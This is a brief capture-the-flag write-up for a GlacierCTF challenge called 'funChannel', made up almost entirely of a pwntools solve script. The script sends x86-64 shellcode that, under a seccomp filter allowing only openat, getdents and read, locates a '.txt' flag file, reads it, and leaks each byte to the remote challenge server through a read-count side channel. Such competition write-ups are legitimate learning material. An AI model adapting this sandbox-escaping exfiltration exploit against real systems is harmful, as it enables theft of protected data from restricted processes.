Side channel exfiltration using shellcode with seccomp restrictions.
Only `read`, `getdents` and `openat` is allowed.

solve.py:
```py
from pwn import *

elf = context.binary = ELF("./funChannel")
flag= "gctf{"

for i in range(len(flag), 0xff):
    shellcode = asm(f"""       
    openat:
        push 0x2e
        mov rsi, rsp
        push AT_FDCWD
        pop rdi
        xor edx, edx
        xor eax, eax
        mov ax, SYS_openat
        syscall

    getdents:
        mov rdi, rax
        push 0x7f
        pop rdx
        shl rdx, 14
        mov rsi, rsp
        push SYS_getdents
        pop rax
        syscall

    egghunt:
        cmp dword ptr [rsp], 0x7478742e /* .txt */
        jz flag_to_stack
        inc rsp
        jmp egghunt

    flag_to_stack:
        sub rsp, 0x21 /* File names are 0x20 bytes long */
        {shellcraft.openat(constants.AT_FDCWD, "rsp")}
        {shellcraft.read("rax", "rsp", 0x100)}
        
    movzx r12, byte ptr [rsp + {i}]

    read_and_decrement:
        mov rdx, r12
        mov rsi, rsp
        xor rdi, rdi
        xor rax, rax
        syscall

        xor rax, rax
        xor rdi, rdi
        dec r12
        jnz read_and_decrement
    """)

    assert len(shellcode) <= 124

    with remote("chall.glacierctf.com", 13383, level="critical") as r: 
        r.sendlineafter(b"Shellcode: ", shellcode)
        try:
            for j in range(256):
                r.send_raw(b'\n')
                sleep(0.3)
                char = chr(j)
        except Exception as e:
            flag += char
            print(flag)
```